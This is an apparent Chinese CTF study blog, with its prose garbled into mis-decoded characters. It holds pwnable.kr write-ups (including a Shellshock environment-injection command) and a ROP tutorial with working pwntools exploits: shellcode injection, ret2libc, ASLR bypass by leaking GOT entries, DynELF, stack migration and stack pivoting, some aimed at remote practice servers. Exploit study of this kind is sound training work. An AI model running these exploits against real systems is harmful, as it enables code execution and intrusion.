inputè€ƒå¯Ÿlinuxç¼–ç¨‹å’Œä¸€äº›åŸºæœ¬æ“ä½œçš„çŸ¥è¯†ï¼Œè™½ç„¶ä½†æ˜¯ï¼Œå¯æƒœğŸ‘´è¿˜æ²¡è¿™äº›åŠŸåº•.. Stage 1// argvif(argc != 100) return 0;if(strcmp(argv['A'],&quot;\\x00&quot;)) return 0;if(strcmp(argv['B'],&quot;\\x20\\x0a\\x0d&quot;)) return 0;printf(&quot;Stage 1 clear!\\n&quot;); ç¬¬ä¸€å…³è¿˜æ˜¯ä¸éš¾ï¼Œç”±ç¬¬ä¸€é¢˜æˆ‘ä»¬çŸ¥é“è¿™å‡ ä¸ªmainå‡½æ•°å‚æ•°çš„ä½œç”¨ï¼Œé¦–å…ˆè¾“å…¥å‚æ•°è¦ç­‰äº100ä¸ª å¹¶ä¸”è¦æ»¡è¶³argv['A']å’Œargv['B'](è¿™æ ·ç”¨asciiç å½“ä½œä¸‹æ ‡æˆ‘å¾ˆå°‘è§.. stage1 char* argv[101] = {0};argv[0] = &quot;/home/input2/input&quot;;char* envp[] = {0, NULL};for(int i = 0; i &lt; 100; ++i){ argv[i] = &quot;A&quot;;}argv['A'] = &quot;\\x00&quot;;argv['B'] = &quot;\\x20\\x0a\\x0d&quot;;execve(&quot;/home/input2/input&quot;,argv,envp); Stage 2// stdiochar buf[4];read(0, buf, 4);if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;read(2, buf, 4);if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;printf(&quot;Stage 2 clear!\\n&quot;); ç¬¬äºŒå…³ç¬¬ä¸€ä¸ªreadä»é”®ç›˜è·å–æ ‡å‡†è¾“å…¥ï¼Œç¬¬äºŒä¸ªreadè·å–ä¸€ä¸ªæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œä¸»è¦éš¾ç‚¹æ˜¯è¦å¦‚ä½•æ„é€ è¿™ä¸ªæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œè¿™é‡Œå°±è¦åˆ©ç”¨linuxçš„I/Oé‡å®šå‘ï¼Œå…ˆè¦forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åé€šè¿‡pipeæ„é€  stage2 int stdin_pip[2] = {-1, -1}; int stderr_pip[2] = {-1, -1}; pid_t childpid; if(pipe(stdin_pip) &lt; 0 || pipe(stderr_pip) &lt; 0) { perror(&quot;FATAL: cannot create pipe&quot;); exit(-1); } #define STDIN_READ stdin_pip[0] //parent #define STDIN_WRITE stdin_pip[1] //child #define STDERR_READ stderr_pip[0] //parent #define STDERR_WRITE stderr_pip[1] //child if((childpid = fork()) &lt; 0) { perror(&quot;FATAL: cannot fork child&quot;); exit(-1); }else if(childpid == 0) /* in the child */ { /*The child process first waits for the parent process to redict pipe_read. Then close them. */ sleep(1); close(STDIN_READ); close(STDERR_READ); /* Writing the corresponding string to the two pipes,the parent process has redicted the pipe_read to the stdin &amp; stderr. */ write(STDIN_WRITE, &quot;\\x00\\x0a\\x00\\xff&quot;, 4); write(STDERR_WRITE, &quot;\\x00\\x0a\\x02\\xff&quot;, 4); }else { //close the child process close(STDERR_WRITE); close(STDIN_WRITE); dup2(STDIN_READ, 0); //stdin redicts to STDIN_pipe dup2(STDERR_READ, 2); //stderr redicts to STDERR_pipe execve(&quot;/home/input2/input&quot;,argv,envp); } å‚è€ƒ Stage 3ç¬¬ä¸‰é¢˜å°±æ”¹ä¸‹ç¯å¢ƒå˜é‡envpé‚£ä¸ªå‚æ•°ï¼Œé€šå¸¸æ˜¯ä»¥Env=vauleçš„å½¢å¼å­˜åœ¨æ•°ç»„é‡Œ stage3 char* envp[2] = {&quot;\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe&quot;, NULL}; Stage 4ç¬¬å››å…³å°±è¦åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œå†™å…¥\\x00\\x00\\x00\\x00ï¼Œç…§ç€å†™å°±è¡Œ stage 4 FILE* fp = fopen(&quot;\\x0a&quot;, &quot;wb&quot;); if(!fp) { perror(&quot;Failed&quot;); exit(-1); }else { puts(&quot;Successs&quot;); } fwrite(&quot;\\x00\\x00\\x00\\x00&quot;, 4, 1, fp); fclose(fp); Stage 5è¿™ä¸€å…³è€ƒå¯Ÿsocketç¼–ç¨‹ï¼Œè¦æ±‚å†™ä¸€ä¸ªsocketé€šä¿¡ï¼Œå¹¶åœ¨agrv['C']å¤„ä¼ å…¥å¯¹åº”çš„å­—ç¬¦ä¸² ä¸€äº›åŸºç¡€çŸ¥è¯† socketç¼–ç¨‹ å‚è€ƒç½‘ä¸Šçš„ä¸€äº›wpï¼Œè·Ÿç€å†™å‡ºæ¥ stage5 è¦æ³¨æ„åœ¨stage 1å¤„æ·»åŠ ä¸€è¡Œargv['C'] = &quot;3737&quot; sleep(2); int sd; struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); saddr.sin_port = htons(3737); char buf[5]; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1) { perror(&quot;Socket error&quot;); exit(-1); } if(connect(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0) { perror(&quot;Can't connect to server&quot;); exit(-1); } strcpy(buf, &quot;\\xde\\xad\\xbe\\xef&quot;); send(sd, buf, 4, 0); close(sd); å› ä¸ºè¿œç¨‹ç¯å¢ƒçš„ç”¨æˆ·æƒé™é—®é¢˜ï¼Œåªèƒ½åœ¨/tmpç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å†å†™å…¥expè„šæœ¬ï¼Œå†ç”¨ln -s /home/input2/flag flagç”Ÿæˆä¸€ä¸ªè½¯é“¾æ¥ï¼Œæœ€åç¼–è¯‘è¿è¡Œexpè„šæœ¬å³å¯ å®Œæ•´exp #include &quot;stdio.h&quot;#include &quot;unistd.h&quot;#include &quot;stdlib.h&quot;#include &quot;sys/socket.h&quot;#include &quot;arpa/inet.h&quot;#include &quot;string.h&quot;int main(){ char* argv[101] = {0}; argv[0] = &quot;/home/input2/input&quot;; char* envp[2] = {&quot;\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe&quot;, NULL}; for(int i = 0; i &lt; 100; ++i) { argv[i] = &quot;A&quot;; } argv['A'] = &quot;\\x00&quot;; argv['B'] = &quot;\\x20\\x0a\\x0d&quot;; argv['C'] = &quot;3737&quot;;/*&lt;--------------------------------------------------&gt;*/ int stdin_pip[2] = {-1, -1}; int stderr_pip[2] = {-1, -1}; pid_t childpid; if(pipe(stdin_pip) &lt; 0 || pipe(stderr_pip) &lt; 0) { perror(&quot;FATAL: cannot create pipe&quot;); exit(-1); } #define STDIN_READ stdin_pip[0] //parent #define STDIN_WRITE stdin_pip[1] //child #define STDERR_READ stderr_pip[0] //parent #define STDERR_WRITE stderr_pip[1] //child if((childpid = fork()) &lt; 0) { perror(&quot;FATAL: cannot fork child&quot;); exit(-1); }else if(childpid == 0) /* in the child */ { /*The child process first waits for the parent process to redict pipe_read. Then close them. */ sleep(1); close(STDIN_READ); close(STDERR_READ); /* Writing the corresponding string to the two pipes,the parent process has redicted the pipe_read to the stdin &amp; stderr. */ write(STDIN_WRITE, &quot;\\x00\\x0a\\x00\\xff&quot;, 4); write(STDERR_WRITE, &quot;\\x00\\x0a\\x02\\xff&quot;, 4); }else { //close the child process close(STDERR_WRITE); close(STDIN_WRITE); dup2(STDIN_READ, 0); //stdin redicts to STDIN_pipe dup2(STDERR_READ, 2); //stderr redicts to STDERR_pipe execve(&quot;/home/input2/input&quot;,argv,envp); }/*&lt;----------------------------------------------------------------&gt;*/ FILE* fp = fopen(&quot;\\x0a&quot;, &quot;wb&quot;); if(!fp) { perror(&quot;Failed&quot;); exit(-1); }else { puts(&quot;Successs&quot;); } fwrite(&quot;\\x00\\x00\\x00\\x00&quot;, 4, 1, fp); fclose(fp);/*&lt;------------------------------------------------------------------&gt;*/ sleep(2); int sd; struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); saddr.sin_port = htons(3737); char buf[5]; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1) { perror(&quot;Socket error&quot;); exit(-1); } if(connect(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0) { perror(&quot;Can't connect to server&quot;); exit(-1); } strcpy(buf, &quot;\\xde\\xad\\xbe\\xef&quot;); send(sd, buf, 4, 0); close(sd); return 0;} åšå®Œè¿™é¢˜ä¹Ÿæ˜¯å­¦åˆ°äº†å¾ˆå¤šä»¥å‰ä¸äº†è§£æˆ–è€…ä¸ç†Ÿæ‚‰çš„linuxå’ŒCè¯­è¨€çš„ç›¸å…³çŸ¥è¯†ï¼Œè¿˜æ˜¯å¾ˆå€¼çš„ã€‚å¦å¤–æ­¤é¢˜åº”è¯¥ä¹Ÿå¯ä»¥ç”¨pythonå†™è„šæœ¬æ‰“è¿œç¨‹ï¼Œå…ˆç•™ä¸ªå‘ï¼Œæœ‰æ—¶é—´è¡¥â€¦ğŸ‘´ç´¯äº† 0x08 legè€ƒå¯Ÿarmæ±‡ç¼–çš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥å‰æ²¡äº†è§£è¿‡ï¼Œæœç´¢äº†è§£ä¸‹åŸºæœ¬çš„ andyhzw&amp;&amp;azeria-labs armå’Œx86å¯¹ç…§è¡¨ é¢˜ç›®ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯ç”¨armå†…è”æ±‡ç¼–å†™çš„ï¼Œåœ¨ä¸»å‡½æ•°ä¸­é€šè¿‡key1()+key2+key3==keyå°±èƒ½æ‹¿åˆ°flagï¼Œé¢˜ç›®ä¹Ÿç»™äº†åæ±‡ç¼–ä»£ç  gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. armæ¶æ„ä¸‹æœ‰ASM modeå’ŒThumb modeä¸¤ç§æ¨¡å¼,åœ¨ASM modeä¸‹æŒ‡ä»¤é•¿åº¦ä¸º2ä¸ªå­—èŠ‚ï¼Œåœ¨Thumb modeä¸‹æŒ‡ä»¤é•¿åº¦ä¸º4ä¸ªå­—èŠ‚ï¼Œpc(r15)æ€»æ˜¯æŒ‡å‘å½“å‰æŒ‡ä»¤åœ°å€ä¸‹ä¸¤æ¡æŒ‡ä»¤çš„åœ°å€ æ‰€ä»¥ç¨‹åºæ‰§è¡Œ0x00008cdcåï¼Œr3=0x00008cdc + 8ï¼Œç„¶åå°†r3ä¼ ç»™r0ä½œä¸ºå‡½æ•°è¿”å›å€¼ï¼Œå³key1=0x00008cdc + 8 gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push {r3} 0x00008d0a &lt;+26&gt;: pop {pc} 0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. é¦–å…ˆå­˜å‚¨r6çš„å€¼ æ‰§è¡Œkey2+12ï¼Œr6=0x00008d05 æŒ‡ä»¤åœ°å€ä¼šå…ˆå’Œ0xFFFFFFFEè¿›è¡ŒæŒ‰ä½ä¸ï¼Œå› ä¸ºæœ€åä¸€ä½è‚¯å®šæ˜¯0ï¼Œå› æ­¤æœ€åä¸€ä½ç”¨äºåšæ ‡å¿—ä½ï¼Œbxæ‰§è¡Œæ—¶å¦‚æœåœ°å€æœ€åä¸€ä½æ˜¯0ï¼Œè¡¨ç¤ºè·³åˆ°asm modeï¼Œ1åˆ™è·³åˆ°thumb mode,å½“å‰åœ°å€æœ€ä½ä½æ˜¯1ï¼Œæ‰€ä»¥æ˜¯thumb mode key+20å¤„ï¼Œr3=0x00008d08 å¾€ä¸‹ï¼Œr3=0x00008d0c æœ€åä¾ç„¶r3ä¼ ç»™r0ï¼Œç”¨r0åšè¿”å›å€¼ã€‚ key2 = 0x00008d0c (gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) r3 = lr r0 = r3 lræ˜¯key3å‡½æ•°çš„è¿”å›åœ°å€ï¼Œåœ¨mainå‡½æ•°çš„åæ±‡ç¼–é‡Œæ‰¾ lrå°±æ˜¯0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;å¤„pc-4çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ key3 = 0x00008d80 exp 0x09 mistakeé¢˜ç›®æè¿°ç»™äº†hintï¼Œæ˜¯å› ä¸ºè¿ç®—ä¼˜å…ˆçº§é€ æˆçš„é”™è¯¯ï¼Œä¸»è¦çœ‹ int fd;if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){ printf(&quot;can't open password %d\\n&quot;, fd); return 0;} ä»”ç»†çœ‹ï¼Œä»–ifè¯­å¥è¿™é‡Œæ˜¯æ²¡æœ‰å¦å¤–åŠ æ‹¬å·çš„ï¼Œå› ä¸ºæ¯”è¾ƒè¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é«˜äºèµ‹å€¼è¿ç®—ç¬¦ï¼Œæ‰€ä»¥fdçš„å€¼æ°¸è¿œä¼šæ˜¯0 è€Œfdæ˜¯0çš„è¯ï¼Œåé¢readçš„fdå‚æ•°å°±æ°¸è¿œæ˜¯0ï¼Œè€Œä¸æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œreadä¹Ÿå°±æ˜¯ä»stdiné‡Œè¯»ï¼Œè€Œä¸æ˜¯ä»/home/mistake/password&quot;è¯» openå‡½æ•°è¿”å›å€¼ æˆåŠŸï¼šæ–°æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ å¤±è´¥ï¼š-1 openè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ä¸€å®šæ˜¯æœ€å°çš„è€Œä¸”æ²¡æœ‰è¢«ä½¿ç”¨çš„ æ‰€ä»¥ä¸¤ä¸ªå‚æ•°çš„bufæˆ‘ä»¬éƒ½å¯æ§ï¼Œbuf2æˆ‘ä»¬æ ¹æ®å¼‚æˆ–çš„è§„å¾‹æ„é€ ä¸€ä¸‹å°±å¥½äº† exp #coding=utf-8from pwn import *shell=ssh(host='pwnable.kr',user='mistake',password='guest',port=2222)io=shell.run('./mistake')buf1 = 'Carylnk\\x00'buf2 = &quot;&quot;for i in buf1: buf2 += chr(ord(i) ^ 1)io.sendafter('do not bruteforce...\\n', buf1)io.sendafter('input password : ', buf2)io.interactive() 0xA shellshock#include &lt;stdio.h&gt;int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(&quot;/home/shellshock/bash -c 'echo shock_me'&quot;); return 0;} é¢˜ç›®æºç æ˜¯å…³äºuidå’Œgidçš„é—®é¢˜ï¼ŒğŸ‘´Linuxæ²¡å­¦å¥½ä¹Ÿä¸æ‡‚ ä¸Šç½‘æœäº†ä¸‹å‘ç°æ˜¯ä¸€ä¸ªå·²ç»å¼€æºçš„æ¼æ´CVE-2014-6271 æµ‹è¯•å‘ç°æ¼æ´æ˜¯å­˜åœ¨ï¼Œä½†æ˜¯è²Œä¼¼æƒé™ä¸å¤Ÿè¯»ä¸äº† è€Œæˆ‘ä»¬è¿è¡Œshellshockç¨‹åºæƒé™å°±ä¼šä¸Šå‡åˆ°egidâ€”â€”shellshock_pwn exp env x='() { :;}; bash -c &quot;cat flag&quot; ' ./shellshock 0xB coin1TODOâ€¦","link":"/2022/02/03/pwnkr/"},{"title":"ROP Study","text":"å‚è€ƒè’¸ç±³ä¸€æ­¥ä¸€æ­¥å­¦ROP linuxä¸‹_x86ç¯‡level1ç¬¬ä¸€é¢˜ä¸»è¦çš„ç‚¹å°±æ˜¯åœ¨æ‰¾shellcodeçš„åœ°å€ï¼Œè¦å¼€å¯core dumpè¿™ä¸ªåŠŸèƒ½ ulimit -c unlimited æ¥ç€ç”¨gdbè°ƒè¯•coreè¿™ä¸ªæ–‡ä»¶ pwndbg&gt; x/10s $esp-1440xffffd480: &quot;1\\311\\367\\341Qh//shh/bin\\211\\343\\260\\vÌ€&quot;, 'a' &lt;repeats 119 times&gt;, &quot;\\220\\324\\377\\377\\n\\325\\377\\377&quot;0xffffd515: &quot;&quot;0xffffd516: &quot;&quot;0xffffd517: &quot;&quot;0xffffd518: &quot;&quot;0xffffd519: &quot;&quot;0xffffd51a: &quot;&quot;0xffffd51b: &quot;&quot;0xffffd51c: &quot;!\\337\\337&quot;, &lt;incomplete sequence \\367&gt;0xffffd521: &quot;\\320\\373&quot;, &lt;incomplete sequence \\367&gt; è¿™é‡Œæˆ‘é‡åˆ°ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œæ¯æ¬¡å‡ºæ¥çš„åœ°å€ä¸åŒï¼Œæœ‰çš„å¯åˆ©ç”¨ï¼Œæœ‰çš„ä¸å¯ä»¥ expå¦‚ä¸‹ from pwn import *io = process('./level1')buf_addr = 0xffffd480shellcode = (asm(shellcraft.sh()))payload = shellcode + (140 - len(shellcode)) * b'a'+ p32(buf_addr)io.sendline(payload)io.interactive() level2level2æˆ‘ä»¬æ‰“å¼€DEP è¿™ä¸ªå°±æ˜¯å…¸å‹çš„ret2libï¼Œåœ¨gdbä¸­å…ˆä½¿ç¨‹åºåœ¨mainä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶årunèµ·æ¥ï¼Œä½¿ç¨‹åºåŠ è½½libc.so,å°±å¯ä»¥ä½¿ç”¨print systemä»¥åŠsearchæ‰¾åˆ°systemå‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€å’Œ/bin/shçš„åœ°å€ exp from pwn import *io = process('./level2')system_addr = 0xf7e222e0bin_sh = 0xf7f630afpayload = b'a' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh)io.sendline(payload)io.interactive() level3è¿™é¢˜æˆ‘ä»¬å†æ‰“å¼€ASLR sudo -s echo 2 &gt; /proc/sys/kernel/randomize_va_space ç”¨lddå‘½ä»¤æŸ¥çœ‹å‘ç°libc.soçš„åœ°å€æ¯æ¬¡éƒ½ä¼šæ”¹å˜ ä¸ºäº†bypass ASLR,æˆ‘ä»¬çš„æ€è·¯æ˜¯ï¼šå…ˆæ³„æ¼å‡ºç¨‹åºå†…æŸäº›å‡½æ•°çš„åœ°å€ï¼Œç„¶åé€šè¿‡å…¶åç§»æ¥ç®—å‡ºåŸºåœ°å€ï¼Œå†ç®—å‡ºæˆ‘ä»¬è¦åˆ©ç”¨å‡½æ•°çš„åœ°å€ å› ä¸ºç¨‹åºä¸­å¹¶æ²¡æœ‰ä½¿ç”¨systemå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨write@plt()å‡½æ•°å°†writeå‡½æ•°çš„åœ°å€é€šè¿‡write@gotæ³„æ¼å‡ºæ¥ï¼ŒåŸå› æ˜¯writeå‡½æ•°æ˜¯åœ¨libc.soä¸­å®ç°çš„ï¼Œå½“æˆ‘ä»¬è°ƒç”¨write@pltæ—¶ï¼Œç³»ç»Ÿå°†writeçš„åœ°å€linkingåˆ°write@gotä¸­ï¼Œé€šè¿‡linuxä¸­çš„LazyBindingï¼Œå®ƒä¼šè·³è½¬åˆ°write@gotä¸Šä»è€Œæ‰¾åˆ°writeå‡½æ•°çš„åœ°å€ è®¡ç®—å‡½æ•°åç§»å¯ä»¥çœ‹è¿™å¼ å›¾ expå¦‚ä¸‹ from pwn import *#io = process('./level2')io = remote('127.0.0.1',10003)elf = ELF('./level2')lib = ELF('libc.so')write_plt = elf.symbols['write']write_got = elf.symbols['write']start = elf.symbols['_start']vul_addr = elf.symbols['vulnerable_function']padding = b'a' * 140payload1 = padding + p32(write_plt)+p32(start)+ p32(1)+ p32(write_got) +p32(4)io.send(payload1)write_addr = u32(io.recv(4))print(hex(write_addr))lib_base = write_addr - lib.symbols['write']system = lib_base + lib.symbols['system']bin_sh = lib_base + next(lib.search(b'/bin/sh'))payload2 = padding + p32(system) + p32(0xdeadbeef) + p32(bin_sh)io.sendline(payload2)io.interactive() level4æ— libc.soçš„ret2libcï¼Œåˆ©ç”¨DynELFæ³„æ¼å‡ºsystemåœ°å€ from pwn import *io = process('./level2')elf = ELF('./level2')write_plt = elf.symbols['write']start = elf.symbols['_start']bss = elf.bss()vul_addr = elf.symbols['vulnerable_function']read_plt = elf.symbols['read']def leak(address): payload = b'a' * 140 + p32(write_plt) + p32(start) + p32(1) + p32(address) + p32(4) io.sendline(payload) data = io.recv(4) return datad = DynELF(leak, elf=ELF('./level2'))system_addr = d.lookup('system', 'libc')payload2 = b'a' * 140 + p32(read_plt) + p32(vul_addr) + p32(0) + p32(bss) + p32(8)io.sendline(payload2)io.send('/bin/sh\\x00')payload3 = b'a' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(bss)io.interactive() linuxä¸‹_x64ç¯‡ å†…å­˜åœ°å€ç”±32ä½å˜ä¸º64ä½ å‚æ•°ä¼ é€’ï¼Œå‰å…­ä¸ªå‚æ•°ä»å·¦åˆ°å³ä¾æ¬¡å­˜åœ¨RDI,RSI,RDX,RCX,R8,R9ã€‚å¤šäºå…­ä¸ªçš„å‚æ•°ä»å³åˆ°å·¦å­˜åœ¨æ ˆä¸Šï¼ŒåŒx86ä¼ å‚ Level2_x64è¿™é‡Œå› ä¸ºæˆ‘æœ¬åœ°ç¯å¢ƒå¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œç¼–è¯‘å‡ºæ¥çš„ç¨‹åºï¼Œexpæ‰“çš„æ—¶å€™æ€»ä¼šæŠ¥é”™ã€‚ã€‚ã€‚äºæ˜¯å°±ç”¨javirs ojä¸Šçš„é¢˜æ¥ç»ƒæ‰‹äº† è¿™é¢˜å’Œä¹‹å‰çš„x86å·®ä¸å¤šï¼Œå°±æ˜¯è¦æ”¹ä¼ å‚çš„æ–¹å¼ exp from pwn import *io = remote('pwn2.jarvisoj.com', 9882)elf = ELF('./level2_x64')system = elf.symbols['system']bin_sh = next(elf.search(b'/bin/sh'))pop_rdi_ret = 0x00000000004006b3payload = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(0xdeadbeef)io.recvuntil('Input:\\n')io.sendline(payload)io.interactive() Level3_x64è¿™é¢˜æ€è·¯ä¹Ÿæ˜¯ä¸x86çš„ç›¸åŒï¼Œåªæ˜¯ä¼ å‚è°ƒç”¨çš„æ–¹å¼å˜äº†ï¼Œè¦è®¾ç½®å¯„å­˜å™¨ä»¥åŠä»å·¦åˆ°å³ä¼ å‚ expå¦‚ä¸‹ from pwn import *io = remote('pwn2.jarvisoj.com',9883)elf = ELF('./level3_x64')lib = ELF('./libc-2.19.so')write_plt = elf.symbols['write']write_got = elf.got['write']start = elf.symbols['_start']pop_rdi_ret = 0x00000000004006b3pop_rdi_r15_ret = 0x00000000004006b1vul_addr = elf.symbols['vulnerable_function']payload = b'a' * 0x88payload += p64(pop_rdi_ret) + p64(1)payload += p64(pop_rdi_r15_ret) + p64(write_got) + p64(0xdeadbeef)payload += p64(write_plt) + p64(start)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)write_addr = u64(io.recv(8))lib_base = write_addr - lib.symbols['write']system = lib_base + lib.symbols['system']bin_sh = lib_base + next(lib.search(b'/bin/sh'))payload2 = b'a' * 0x88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload2)io.interactive() HITCON Trainging - lab5&amp;&amp;lab6 åœ¨static linkingæƒ…å†µä¸‹æœ‰å¾ˆå¤šgadgetå¯ä»¥åˆ©ç”¨ bypass DEP/NX æºç¨‹åº #include &lt;stdio.h&gt;int main(){ char buf[20]; puts(&quot;ROP is easy is'nt it ?&quot;); printf(&quot;Your input :&quot;); fflush(stdout); read(0,buf,100); } æŸ¥çœ‹ä¿æŠ¤ Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) Static LinkingFile simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped exp from pwn import *io = process('./simplerop')context.arch = 'i386'padding = b'a' * 32buf_data = 0x080ea060 # size use 68pop_eax_ret = 0x080bae06pop_edx_ecx_ebx_ret = 0x0806e850mov_dedx_eax_ret = 0x0809a15dpop_edx_ret = 0x0806e82apop_edx_ecx_ebx_ret = 0x0806e850int_80 = 0x080493e1rop = flat([pop_edx_ret,buf_data,pop_eax_ret,'/bin',mov_dedx_eax_ret])rop += flat([pop_edx_ret,buf_data+4,pop_eax_ret,'/sh\\x00',mov_dedx_eax_ret])rop += flat([pop_edx_ecx_ebx_ret,0,0,buf_data,pop_eax_ret,0xb,int_80])payload = padding + ropio.recvuntil(&quot;:&quot;)io.sendline(payload)io.interactive() Using ROP bypass ASLR å‡è®¾dynamicç¼–è¯‘çš„ç¨‹åºä¸­å­˜åœ¨BOFæ¼æ´ä¸”æ²¡å¼€PIEæƒ…å†µ(å…ˆä¸è€ƒè™‘Stack Guard) How to bypass Use .plt section to leak information å­˜åœ¨put write sendâ€¦ç­‰ output function Stack Migration#include &lt;stdio.h&gt;int count = 1337 ;int main(){ if(count != 1337) _exit(1); count++; char buf[40]; setvbuf(stdout,0,2,0); puts(&quot;Try your best :&quot;); read(0,buf,64); return ; } gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration exp from pwn import *import timeio = process('./migration')elf = ELF('./migration')libc = ELF('/lib/i386-linux-gnu/libc.so.6')padding = b'a' * 40 #44 é¢„ç•™4ä¸ªbyteæ§åˆ¶ebpbuf1 = 0x804ae00buf2 = buf1 + 0x100read_plt = elf.plt['read']put_plt = elf.plt['puts']leave_ret = 0x08048418pop_ebx_ret = 0x0804836dput_got = elf.got['puts']put_off = libc.symbols['puts']rop1 = flat([buf1,read_plt,leave_ret,0,buf1,100])payload = padding + rop1io.send(payload)time.sleep(0.1)rop2 = flat([buf2,put_plt,pop_ebx_ret,put_got,read_plt,leave_ret,0,buf2,100])io.send(rop2)time.sleep(0.1)io.recvuntil(&quot;\\n&quot;)data = u32(io.recvuntil(&quot;\\n&quot;)[:-1])lib = data - put_offprint(hex(lib))system = lib + libc.symbols['system']bin_sh = buf2 + 16 #bin_shåœ¨rop3çš„ç¬¬å››ä¸ªï¼Œä¸€ä¸ªå 4byterop3 = flat([buf1,system,0xdeadbeef,bin_sh,'/bin/sh\\x00'])io.send(rop3)time.sleep(0.1)io.interactive() Stack Pivotingæ¦‚å¿µè½¬è‡ªCTF-WIKI åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„ å¯ä»¥æ§åˆ¶çš„æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°è¾ƒå°‘ï¼Œéš¾ä»¥æ„é€ è¾ƒé•¿çš„ ROP é“¾ å¼€å¯äº† PIE ä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸã€‚ å…¶å®ƒæ¼æ´éš¾ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚è¯´å°†æ ˆåŠ«æŒåˆ°å †ç©ºé—´ï¼Œä»è€Œåœ¨å †ä¸Šå†™ rop åŠè¿›è¡Œå †æ¼æ´åˆ©ç”¨ X-CTF Quals 2016 - b0verfl0wå…ˆæ”¾exp from pwn import *io = process('./b0verfl0w')jmp_esp = 0x08048504shellcode = b&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot;padding = (0x20 - len(shellcode)) * b'a'#payload#shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp espsub_esp_jmp = asm('sub esp, 